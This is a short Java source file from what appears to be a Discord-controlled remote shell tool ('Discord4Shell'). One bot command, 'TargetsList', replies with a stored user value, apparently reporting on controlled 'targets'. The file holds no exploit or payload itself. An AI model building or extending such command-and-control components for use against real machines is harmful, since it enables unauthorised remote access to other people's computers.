package org.example.commands;

import net.dv8tion.jda.api.hooks.ListenerAdapter;
import net.dv8tion.jda.api.events.message.MessageReceivedEvent;
import static org.example.Discord4Shell.Discord4Shell.*;



public class TargetsListMessage extends ListenerAdapter {
    public void onMessageReceived(MessageReceivedEvent event) {
        if (event.getAuthor().isBot()) {
            return;
        }

        if (event.getMessage().getContentRaw().equalsIgnoreCase("TargetsList")) {
            event.getChannel().sendMessage(user).queue();
        }
    }


}
